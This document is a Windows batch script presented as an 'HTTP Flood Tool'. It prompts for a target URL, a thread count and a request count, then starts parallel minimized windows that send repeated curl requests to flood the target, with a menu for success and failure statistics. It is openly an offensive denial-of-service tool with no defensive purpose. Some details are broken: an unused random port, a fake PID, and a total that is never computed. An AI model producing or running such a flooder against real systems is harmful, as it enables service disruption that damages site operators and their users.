@echo off
title HTTP Flood Tool
color 0C
setlocal enabledelayedexpansion

:menu
cls
echo ================================================
echo           HTTP FLOOD TOOL - BATCH v2.0
echo ================================================
echo.
echo [1] Start HTTP Flood Attack
echo [2] View Statistics
echo [3] Exit
echo.
set /p choice="Select option: "

if "%choice%"=="1" goto attack
if "%choice%"=="2" goto stats
if "%choice%"=="3" exit
goto menu

:attack
cls
set /p url="Enter full URL (e.g., http://192.168.1.1/index.php): "
set /p requests="Number of requests per thread (default 1000): "
if "%requests%"=="" set requests=1000
set /p threads="Number of concurrent threads (1-50): "
if "%threads%"=="" set threads=10

echo.
echo [*] Target: %url%
echo [*] Requests per thread: %requests%
echo [*] Threads: %threads%
echo [*] Starting attack...
echo.

set success=0
set fail=0
set count=0

:loop
if %count% geq %threads% goto monitor

set /a port=%random% %% 65535 + 1
set /a count+=1

start /min cmd /c "(
  for /l %%i in (1,1,%requests%) do (
    curl -s -o nul -w "" -X GET %url% 2>nul
    if !errorlevel!==0 (
      echo [+] Request %%i sent >> success.log
    ) else (
      echo [-] Request %%i failed >> fail.log
    )
    timeout /t 0 /nobreak >nul
  )
)"

echo [*] Thread %count% started with PID !random!
timeout /t 1 /nobreak >nul
goto loop

:monitor
echo.
echo [*] All threads running. Monitoring...
timeout /t 10 /nobreak >nul

:stats
cls
echo ================================================
echo              STATISTICS
echo ================================================
if exist success.log (
  for /f %%a in ('type success.log ^| find /c "+"') do set sc=%%a
) else set sc=0
if exist fail.log (
  for /f %%a in ('type fail.log ^| find /c "-"') do set fc=%%a
) else set fc=0

echo Successful requests: %sc%
echo Failed requests: %fc%
echo Total sent: %sc%+%fc%
echo.
pause
goto menu
